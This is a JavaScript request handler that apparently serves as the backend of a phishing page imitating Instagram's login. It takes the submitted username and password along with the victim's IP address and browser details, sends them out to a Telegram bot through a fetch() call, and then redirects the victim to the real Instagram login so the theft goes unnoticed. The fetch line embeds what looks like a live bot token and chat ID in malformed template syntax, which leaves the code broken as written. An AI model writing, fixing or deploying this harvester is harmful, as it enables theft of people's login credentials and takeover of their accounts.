export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { username, password } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const ua = req.headers['user-agent'];
        const ts = new Date().toISOString();

        const msg = encodeURIComponent(
            `🎯 New Instagram Credentials!\n\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕐 Time: ${ts}`
        );

        // Send to Telegram
        const BOT_TOKEN = "YOUR_BOT_TOKEN";
        const CHAT_ID = "YOUR_CHAT_ID";
        await fetch(`https://api.telegram.org/bot${8722382021:AAEhs71lAw8p1m4due-ICYMjKUNuylcVUq4}/sendMessage?chat_id=${6797160131}&text=${msg}`);

        // Redirect to real Instagram
        res.writeHead(302, { Location: 'https://www.instagram.com/accounts/login/' });
        res.end();
    }
}